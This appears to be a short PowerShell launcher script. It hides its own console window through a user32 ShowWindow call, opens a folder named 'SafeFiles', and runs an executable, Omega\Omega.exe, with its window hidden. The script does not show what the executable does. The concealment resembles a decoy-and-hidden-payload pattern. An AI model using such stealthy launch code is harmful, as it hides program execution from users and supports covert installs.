$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'                  #This is for making the console close almost the moment its opened
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)


Invoke-Item "SafeFiles\"
start-process -filepath '.\Omega\Omega.exe' -Wait -WindowStyle Hidden

